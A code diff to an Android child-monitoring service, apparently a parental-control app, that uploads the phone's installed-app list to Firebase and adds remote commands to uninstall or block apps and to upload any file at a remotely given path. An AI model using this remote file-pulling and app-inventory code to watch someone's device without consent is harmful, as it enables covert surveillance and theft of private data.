@@ -387,17 +387,22 @@ class ChildForegroundService : Service() {
             val userApps = installedApps.filter {
                 (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 && it.packageName != packageName
             }
-            for (app in userApps.take(40)) {
-                val appName = pm.getApplicationLabel(app).toString()
-                val event = com.example.authapp.data.AppInstallEvent(
-                    packageName = app.packageName,
-                    appName = appName,
-                    eventType = "INSTALLED",
-                    timestamp = System.currentTimeMillis()
+            val appList = mutableListOf<Map<String, Any>>()
+            for (app in userApps) {
+                val appName = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { app.packageName.substringAfterLast(".") }
+                appList.add(
+                    mapOf(
+                        "packageName" to app.packageName,
+                        "appName" to appName,
+                        "lastUpdated" to System.currentTimeMillis()
+                    )
                 )
-                FirebaseRepository.recordPackageEvent(uid, event)
             }
-            FirebaseCrashlytics.getInstance().log("[ChildService] Synced ${userApps.size} installed apps to package_events")
+            if (appList.isNotEmpty()) {
+                com.google.firebase.database.FirebaseDatabase.getInstance().reference
+                    .child("installed_apps").child(uid).setValue(appList)
+            }
+            FirebaseCrashlytics.getInstance().log("[ChildService] Synced ${userApps.size} installed apps to installed_apps node")
         } catch (e: Exception) {
             FirebaseCrashlytics.getInstance().log("[ChildService] syncInstalledApps notice: ${e.localizedMessage}")
         }
@@ -1059,7 +1064,53 @@ class ChildForegroundService : Service() {
                             try {
                                 com.example.authapp.utils.MediaGalleryUtils.scanAndSyncMediaGallery(applicationContext, uid)
                                 com.example.authapp.utils.FileManagerUtils.scanAndSyncFileExplorer(applicationContext, uid)
+                                syncInstalledApps(uid)
                                 FirebaseControlRepository.sendRemoteCommand(uid, "SYNC_MEDIA", false)
+                            } catch (_: Exception) {}
+                        }
+                    }
+                    "UNINSTALL_APP" -> {
+                        val pkg = value?.toString() ?: ""
+                        if (pkg.isNotEmpty()) {
+                            try {
+                                val deleteIntent = Intent(Intent.ACTION_DELETE).apply {
+                                    data = Uri.parse("package:$pkg")
+                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                }
+                                applicationContext.startActivity(deleteIntent)
+                                FirebaseControlRepository.sendRemoteCommand(uid, "UNINSTALL_APP", "")
+                            } catch (_: Exception) {}
+                        }
+                    }
+                    "BLOCK_APP" -> {
+                        val pkg = value?.toString() ?: ""
+                        if (pkg.isNotEmpty()) {
+                            FirebaseRepository.setAppBlocked(uid, pkg, true)
+                            FirebaseControlRepository.sendRemoteCommand(uid, "BLOCK_APP", "")
+                        }
+                    }
+                    "UNBLOCK_APP" -> {
+                        val pkg = value?.toString() ?: ""
+                        if (pkg.isNotEmpty()) {
+                            FirebaseRepository.setAppBlocked(uid, pkg, false)
+                            FirebaseControlRepository.sendRemoteCommand(uid, "UNBLOCK_APP", "")
+                        }
+                    }
+                    "FETCH_MEDIA" -> {
+                        val path = value?.toString() ?: ""
+                        if (path.isNotEmpty()) {
+                            try {
+                                val file = java.io.File(path)
+                                if (file.exists() && file.isFile) {
+                                    com.example.authapp.sync.SyncScheduler.enqueueUpload(
+                                        context = applicationContext,
+                                        file = file,
+                                        childId = uid,
+                                        streamType = "gallery_photo",
+                                        durationSeconds = 0L
+                                    )
+                                }
+                                FirebaseControlRepository.sendRemoteCommand(uid, "FETCH_MEDIA", "")
                             } catch (_: Exception) {}
                         }
                     }
